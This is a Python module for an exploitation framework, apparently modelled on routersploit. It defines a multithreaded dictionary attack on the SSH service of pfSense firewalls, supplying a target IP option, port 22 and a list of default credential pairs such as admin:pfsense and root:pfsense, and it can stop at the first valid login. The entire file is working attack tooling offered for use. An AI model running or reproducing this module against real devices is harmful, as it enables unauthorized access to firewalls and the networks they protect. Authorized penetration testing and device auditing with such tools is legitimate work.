# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """pfSense Firewall Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "pfSense Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against pfSense SSH service. "
            "pfSense is widely deployed as a SOHO/SMB firewall/router on x86 hardware. "
            "Default credentials admin:pfsense persist when first-time wizard is skipped. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "pfSense CE (Community Edition) all versions",
            "pfSense Plus (Netgate) all versions",
            "pfSense appliances: SG-1100, SG-2100, SG-3100, SG-4100",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "admin:pfsense,root:pfsense,admin:admin,admin:password",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
